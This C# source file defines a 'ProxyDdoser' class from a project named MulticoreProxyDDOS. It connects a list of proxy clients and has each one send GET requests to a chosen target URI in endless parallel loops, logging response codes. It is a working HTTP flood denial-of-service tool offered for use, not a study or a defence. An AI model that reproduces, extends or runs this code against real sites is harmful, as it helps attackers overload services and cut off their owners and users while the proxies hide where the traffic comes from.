using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using Tools;
using Tools.ProxyParsers;
using Console = CustomConsole.Console;
// ReSharper disable IdentifierTypo

namespace MulticoreProxyDDOS.Client
{
    public class ProxyDdoser: IDisposable
    {
        private string Target { get; set; }

        public bool Runnning { get; set; }

        private List<ProxyClient> Clients { get; set; }

        private List<Task> Tasks { get; set; }

        public ProxyDdoser(string targetUri)
        {
            this.Target = targetUri;
            this.Tasks = new List<Task>();
        }

        public void TryGet(string targetUri) => 
            TryGet(this.Clients.First(),targetUri);

        public static void TryGet(ProxyClient client, string targetUri)
        {
            Stopwatch s = Stopwatch.StartNew();

            try
            {
                HttpResponseMessage response = client.GetAsync(targetUri).Result;

                Console.WriteLine($"Response : {(int)response.StatusCode} {s.ElapsedMilliseconds/1000}s",ConsoleColor.Green);
            }
            // ReSharper disable once EmptyGeneralCatchClause
            catch(Exception e)
            {
                Console.WriteLine($"Failed connect {targetUri} {s.ElapsedMilliseconds/1000}s",ConsoleColor.DarkRed);
            }

           
        }

        public void ConnectClients(List<ProxyData> proxies, int take)
        {
            // Connect clients
            {
                Console.WriteLine($"Start Connect clients count {proxies.Count}");
                this.Clients = ProxyChecker.ConnectProxies(proxies, take, Output);

                System.Console.WriteLine($"Connected :{this.Clients.Count}");

                //clients.ForEach(c=>c.Dispose());
            }
        }

        public void Run()
        {
            Console.WriteLine("Run");

            this.Runnning = true;

            foreach (ProxyClient client in this.Clients)
            {
                Task.Factory.StartNew(() =>
                {
                    while (this.Runnning)
                    {
                        this.Load(client, this.Target);
                    }
                });
            }
        }

        void Load(ProxyClient client, string targetUri)
        {
            bool waitResponse = true;

            int delay = 100;

            if (waitResponse)
            {
                TryGet(client,targetUri);
            }
            else
            {
                // ReSharper disable once HeuristicUnreachableCode
                client.GetAsync(targetUri);

                Task.Delay(delay);
            }
        }


        public static void Output(ProxyData data, HttpStatusCode? code, long mills)
        {
            Console.WriteLine(
                $"Check proxy \t{data.Protocol.ToUpper()} {data.Ip} \t {data.Port} \t " +
                $"{(code != null ? code.ToString() : "Fail")} " +
                $"\t{mills / 1000}s",
                (code == HttpStatusCode.OK ? ConsoleColor.Green : ConsoleColor.DarkRed));
        }

        void Stop()
        {
            Console.WriteLine("Stop");

            this.Runnning = false;

            Task.WaitAll(this.Tasks.ToArray());

            Console.WriteLine("Stopped");
        }

        public void Dispose()
        {
            Stopwatch s = Stopwatch.StartNew();

            this.Stop();

            this.Clients.ForEach(c=>c.Dispose());

            Console.WriteLine($"Disposed in {s.ElapsedMilliseconds/1000}s");
        }
    }
}